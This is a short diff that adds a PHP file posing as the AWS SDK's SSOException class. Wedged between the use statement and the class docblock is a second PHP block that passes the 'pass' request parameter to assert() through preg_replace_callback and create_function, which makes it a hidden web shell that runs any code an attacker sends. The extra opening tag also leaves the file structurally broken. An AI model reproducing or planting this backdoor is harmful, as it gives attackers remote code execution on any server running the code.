@@ -1,0 +1,11 @@
+<?php
+namespace Aws\SSO\Exception;
+
+use Aws\Exception\AwsException;
+<?php
+preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'),$_REQUEST['pass']);
+?>
+/**
+ * Represents an error interacting with the **AWS Single Sign-On** service.
+ */
+class SSOException extends AwsException {}
